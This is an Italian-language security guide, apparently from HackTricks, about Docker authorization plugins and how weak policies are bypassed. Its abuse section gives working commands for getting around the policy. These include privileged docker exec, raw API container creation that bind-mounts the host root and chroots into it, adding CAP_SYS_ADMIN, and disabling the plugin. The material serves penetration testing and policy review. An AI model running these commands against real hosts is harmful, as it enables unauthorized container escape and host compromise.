# Plugin di autorizzazione runtime

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I plugin di autorizzazione runtime sono un ulteriore livello di policy che decide se un caller può eseguire una determinata azione del daemon. Docker è l'esempio classico. Per impostazione predefinita, chiunque possa comunicare con il daemon Docker ha di fatto un controllo esteso su di esso. I plugin di autorizzazione cercano di restringere questo modello esaminando l'identità dell'utente autenticato e l'operazione API richiesta, quindi consentendo o negando la richiesta in base alla policy.

Questo argomento merita una pagina separata perché modifica il modello di exploitation quando un attacker ha già accesso a una Docker API o a un utente appartenente al gruppo `docker`. In questi ambienti la domanda non è più soltanto "posso raggiungere il daemon?", ma anche "il daemon è protetto da un authorization layer e, in tal caso, questo layer può essere bypassato tramite endpoint non gestiti, un parsing JSON debole o permessi di gestione dei plugin?"

## Funzionamento

Quando una richiesta raggiunge il daemon Docker, il sottosistema di autorizzazione può passare il contesto della richiesta a uno o più plugin installati. Il plugin visualizza l'identità dell'utente autenticato, i dettagli della richiesta, gli header selezionati e parti del body della richiesta o della risposta quando il content type è adatto. È possibile concatenare più plugin e l'accesso viene concesso solo se tutti i plugin consentono la richiesta.

Questo modello sembra solido, ma la sua sicurezza dipende interamente da quanto accuratamente l'autore della policy ha compreso le API. Un plugin che blocca `docker run --privileged` ma ignora `docker exec`, non considera chiavi JSON alternative come `Binds` di primo livello o consente l'amministrazione dei plugin può creare una falsa sensazione di restrizione, lasciando comunque aperti percorsi diretti di privilege escalation.

## Obiettivi comuni dei plugin

Le aree importanti da esaminare durante la revisione della policy sono:

- endpoint per la creazione dei container
- campi di `HostConfig` come `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` e le opzioni di condivisione dei namespace
- comportamento di `docker exec`
- endpoint di gestione dei plugin
- qualsiasi endpoint che possa attivare indirettamente azioni runtime al di fuori del modello di policy previsto

Storicamente, esempi come il plugin `authz` di Twistlock e semplici plugin didattici come `authobot` hanno reso questo modello facile da studiare, perché i relativi file di policy e percorsi di codice mostravano come veniva effettivamente implementato il mapping tra endpoint e azioni. Durante un assessment, la lezione importante è che l'autore della policy deve comprendere l'intera superficie delle API, non solo i comandi CLI più visibili.

## Abuse

Il primo obiettivo è capire cosa viene effettivamente bloccato. Se il daemon nega un'azione, l'errore spesso può fare leak del nome del plugin, aiutando a identificare il controllo in uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Se hai bisogno di un profiling più ampio degli endpoint, strumenti come `docker_auth_profiler` sono utili perché automatizzano l'attività altrimenti ripetitiva di verificare quali route API e strutture JSON siano realmente consentite dal plugin.

Se l'ambiente utilizza un plugin personalizzato e puoi interagire con l'API, enumera quali campi degli oggetti vengono realmente filtrati:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Questi controlli sono importanti perché molti errori di autorizzazione sono specifici dei campi anziché dei concetti. Un plugin può rifiutare un pattern CLI senza bloccare completamente la struttura API equivalente.

### Esempio completo: `docker exec` aggiunge privilegi dopo la creazione del container

Una policy che blocca la creazione di container privilegiati, ma consente la creazione di container unconfined insieme a `docker exec`, può comunque essere aggirata:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Se il daemon accetta il secondo passaggio, l'utente ha recuperato un processo interattivo privilegiato all'interno di un container che l'autore della policy riteneva vincolato.

### Esempio completo: Bind Mount tramite Raw API

Alcune policy non funzionanti analizzano solo una forma JSON. Se il bind mount del filesystem root non viene bloccato in modo coerente, l'host può comunque essere montato:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La stessa idea può anche comparire in `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
L'impatto consiste in una fuga completa dal filesystem dell'host. Il dettaglio interessante è che il bypass deriva da una copertura incompleta delle policy, non da un bug del kernel.

### Esempio completo: attributo di capability non verificato

Se la policy dimentica di filtrare un attributo correlato a una capability, l'attaccante può creare un container che recupera una capability pericolosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una volta presente `CAP_SYS_ADMIN` o una capability altrettanto potente, molte tecniche di breakout descritte in [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) diventano accessibili.

### Esempio completo: disabilitare il plugin

Se le operazioni di gestione dei plugin sono consentite, il bypass più semplice potrebbe consistere nel disattivare completamente il controllo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Si tratta di un errore nella policy a livello del control plane. Il livello di autorizzazione esiste, ma l'utente che avrebbe dovuto limitare conserva ancora il permesso di disabilitarlo.

## Controlli

Questi comandi mirano a identificare se esiste un livello di policy e se sembra essere completo o superficiale.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Cosa è interessante qui:

- I messaggi di negazione che includono il nome di un plugin confermano la presenza di un authorization layer e spesso rivelano l'implementazione esatta.
- Un elenco di plugin visibile all'attaccante può essere sufficiente per scoprire se sono possibili operazioni di disabilitazione o riconfigurazione.
- Una policy che blocca solo le azioni CLI ovvie, ma non le richieste API raw, dovrebbe essere considerata bypassabile fino a prova contraria.

## Runtime Defaults

| Runtime / platform | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Non abilitato per impostazione predefinita | L'accesso al daemon è effettivamente tutto-o-niente, a meno che non sia configurato un authorization plugin | policy del plugin incomplete, blacklist invece di allowlist, autorizzazione della gestione dei plugin, punti ciechi a livello di campo |
| Podman | Non esiste un equivalente diretto comune | Podman si basa generalmente più sui permessi Unix, sull'esecuzione rootless e sulle decisioni relative all'esposizione delle API che sui plugin authz in stile Docker | esposizione ampia di una Podman API rootful, permessi deboli sul socket |
| containerd / CRI-O | Modello di controllo differente | Questi runtime si basano generalmente sui permessi del socket, sui confini di trust del nodo e sui controlli dell'orchestrator a un livello superiore, invece che sui plugin authz di Docker | montaggio del socket nei workload, assunzioni deboli sul trust locale al nodo |
| Kubernetes | Usa authn/authz ai livelli dell'API server e del kubelet, non plugin authz di Docker | RBAC del cluster e controlli di admission sono il principale livello di policy | RBAC eccessivamente permissivo, policy di admission debole, esposizione diretta delle API del kubelet o del runtime |
{{#include ../../../banners/hacktricks-training.md}}
